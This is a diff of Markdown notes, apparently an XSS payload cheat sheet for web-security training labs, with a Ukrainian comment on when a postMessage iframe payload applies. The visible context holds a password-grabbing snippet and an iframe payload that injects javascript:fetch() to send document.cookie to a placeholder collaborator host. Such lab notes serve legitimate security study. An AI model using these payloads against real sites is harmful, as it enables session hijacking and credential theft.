@@ -120,7 +120,7 @@ body:username.value+':'+this.value
 });">
 ```
 **Iframe**
->частково універсальні для exploit server
+>для exploit server у випадку коли є addEventListener(), в лабораторній роботі не передаються cookie через csp
 ```
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:fetch(\'https://your-collaborator-url.com/\'+document.cookie)','*')">
 </iframe>
